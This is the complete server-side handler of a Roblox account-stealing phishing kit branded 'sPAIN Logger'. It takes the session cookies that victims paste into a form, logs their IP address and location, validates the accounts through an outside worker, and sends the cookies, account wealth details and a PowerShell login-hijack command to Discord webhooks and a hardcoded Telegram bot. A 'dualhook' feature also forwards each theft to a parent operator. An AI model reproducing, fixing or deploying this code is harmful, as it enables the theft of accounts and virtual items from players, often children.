// api/submit.js
const REDIS_URL  = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN   = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT    = process.env.TG_CHAT  || '7538845070';
const WORKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function redisSet(key, value) {
  try {
    const res = await fetch(
      `${REDIS_URL}/set/${encodeURIComponent(key)}/${encodeURIComponent(JSON.stringify(value))}`,
      { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } }
    );
    return res.ok;
  } catch { return false; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp`);
    const d = await r.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = raw.trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

async function getWorkerData(cookie, victimIp) {
  try {
    const r = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, victimIp })
    });
    if (!r.ok) return null;
    return await r.json();
  } catch { return null; }
}

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

async function discordChunked(url, text, lang = '') {
  const wrap  = lang ? `\`\`\`${lang}\n` : '';
  const end   = lang ? '\n```' : '';
  const limit = 1990 - wrap.length - end.length;
  let rem = text, first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, limit); rem = rem.substring(limit);
    const last  = rem.length === 0;
    await discordSend(url, { content: (first ? wrap : '') + chunk + (last ? end : '') });
    first = false;
  }
}

// ── STEP 1: fast capture embed — sent immediately before worker call ──────────
async function sendCapture(webhookUrl, { cookie, ip, geo, now, pageName }) {
  // Embed header
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:       `✅ Cookie Captured — ${pageName}`,
      description: 'Fetching account info... full embed coming right after.',
      color:       0x00cc44,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                                                                       inline: true  },
        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown',    inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                                 inline: true  },
        { name: '🕐 Time',     value: now,                                                                                    inline: false }
      ],
      footer: { text: `sPAIN Logger • ${pageName} • ${now}` }
    }]
  });
  // Raw cookie immediately — so it never expires even if Roblox info takes time
  await discordChunked(webhookUrl, cookie);
}

// ── STEP 2: rich info embed — sent after worker returns ───────────────────────
async function sendRichEmbed(webhookUrl, { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl }) {
  await discordSend(webhookUrl, {
    embeds: [{
      title:       `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
      description: `🔥 \`sPAIN\` 🔥\n\n[Profile 👤](https://www.roblox.com/users/${roblox.id}/profile)${refreshUrl ? `\n[🔄 Refresh](${refreshUrl})` : ''}`,
      color:       5793266,
      thumbnail:   { url: roblox.avatarUrl },
      fields: [
        { name: '🔴 Robux',    value: `${roblox.robux?.toLocaleString() || 0}`,                                              inline: true  },
        { name: '🎵 RAP',      value: `${roblox.limitedsValue?.toLocaleString() || 0}\n(${roblox.limitedsCount || 0} items)`, inline: true  },
        { name: '🗓️ Age',      value: `${roblox.accountAgeDays} days`,                                                       inline: true  },
        { name: '💎 Premium',  value: roblox.isPremium ? 'Yes ✅' : 'No ❌',                                                 inline: true  },
        { name: '👥 Groups',   value: `Owned: ${roblox.groupsOwned} | R$: ${roblox.groupRobux?.toLocaleString() || 0}`,     inline: true  },
        { name: '🌐 IP',       value: ip || 'Unknown',                                                                       inline: true  },
        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') + (geo?.isp ? `\n${geo.isp}` : ''), inline: false },
        { name: '⚙️ Account',  value: `Email: ${roblox.emailSet}  2FA: ${roblox.twoFA}`,                                    inline: false },
        { name: '🎯 Gamepasses', value: `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'} | Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: false },
        { name: '📋 PowerShell', value: '```\n' + (powershell || '').substring(0, 1000) + '\n```', inline: false }
      ],
      footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
      timestamp: now
    }]
  });

  // Full PowerShell chunked after embed
  if (powershell && powershell.length > 1000) {
    await discordChunked(webhookUrl, powershell, 'powershell');
  }

  // Refresh card
  if (refreshUrl) {
    await discordSend(webhookUrl, {
      embeds: [{
        title:       '🔄 Refresh PowerShell Anytime',
        description: `**${refreshUrl}**\nClick whenever you need a fresh command for this account.`,
        color:       0x06b6d4,
        footer:      { text: 'sPAIN Tools • Keep this private' }
      }]
    });
  }
}

async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
  await discordSend(webhookUrl, {
    content: '@everyone',
    embeds: [{
      title:  '⚠️ Invalid Cookie — trolling 💀',
      color:  0xff3333,
      fields: [
        { name: '🌐 IP',       value: ip || 'Unknown',                                                                    inline: true  },
        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',                  inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                              inline: true  },
        { name: '🕐 Date',     value: now,                                                                                 inline: false }
      ],
      footer: { text: `sPAIN Tools • ${pageName}` }
    }]
  });
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });

  // 200 immediately — client done
  res.status(200).json({ success: true });

  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
            || req.headers['x-real-ip'] || 'Unknown';

    const cookie = findCookie(slots);

    if (!cookie) {
      // No cookie found at all
      const [geo] = await Promise.all([getIpGeo(ip)]);
      const now   = new Date().toISOString();
      const pName = record.displayName || slug;
      let parent  = null;
      if (record.dualhookParent) parent = await redisGet(`slot:${record.dualhookParent}`);
      await sendInvalid(record.webhook, { ip, geo, now, pageName: pName });
      if (parent?.webhook && parent.webhook !== record.webhook)
        await sendInvalid(parent.webhook, { ip, geo, now, pageName: pName });
      await tgSend(`⚠️ <b>NO COOKIE</b>\n📄 ${pName}\n🌐 <code>${ip}</code>`);
      return;
    }

    // Geo + worker run in parallel — both start immediately, no waiting
    const [geo, workerData] = await Promise.all([
      getIpGeo(ip),
      getWorkerData(cookie, ip)
    ]);

    const roblox     = workerData?.valid ? workerData : null;
    const powershell = workerData?.powershell || null;
    const now        = new Date().toISOString();
    const pageName   = record.displayName || slug;

    let parent = null;
    if (record.dualhookParent) parent = await redisGet(`slot:${record.dualhookParent}`);

    // Save refresh entry BEFORE Discord so link is ready
    const refreshId  = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
    const refreshUrl = `https://spain-tools.vercel.app/r/${refreshId}`;
    await redisSet(`refresh:${refreshId}`, {
      cookie,
      webhook:  record.webhook,
      webhook1: parent?.webhook || null,
      pageName
    });

    const capturePayload = { cookie, ip, geo, now, pageName };
    const richPayload    = { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl };

    if (roblox) {
      // Send quick capture (raw cookie instantly) then rich embed
      await sendCapture(record.webhook, capturePayload);
      if (parent?.webhook && parent.webhook !== record.webhook)
        await sendCapture(parent.webhook, capturePayload);

      await sendRichEmbed(record.webhook, richPayload);
      if (parent?.webhook && parent.webhook !== record.webhook)
        await sendRichEmbed(parent.webhook, richPayload);

      await tgSend([
        `✅ <b>HIT — ${roblox.username} ${roblox.isPremium ? '⭐' : ''}</b>`,
        `💰 Robux: ${roblox.robux?.toLocaleString() || 0}`,
        `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
        `📄 Page: ${pageName}`,
        `🔄 ${refreshUrl}`
      ].join('\n'));
    } else {
      // Worker failed but cookie exists — send cookie immediately so it's not wasted
      await sendCapture(record.webhook, capturePayload);
      if (parent?.webhook && parent.webhook !== record.webhook)
        await sendCapture(parent.webhook, capturePayload);
      if (powershell) {
        await discordChunked(record.webhook, powershell, 'powershell');
        if (parent?.webhook && parent.webhook !== record.webhook)
          await discordChunked(parent.webhook, powershell, 'powershell');
      }
      await tgSend(`⚠️ <b>WORKER FAILED</b> — cookie sent\n📄 ${pageName}\n🌐 <code>${ip}</code>`);
    }

  } catch (err) {
    console.error('Post-response error:', err.message);
  }
}
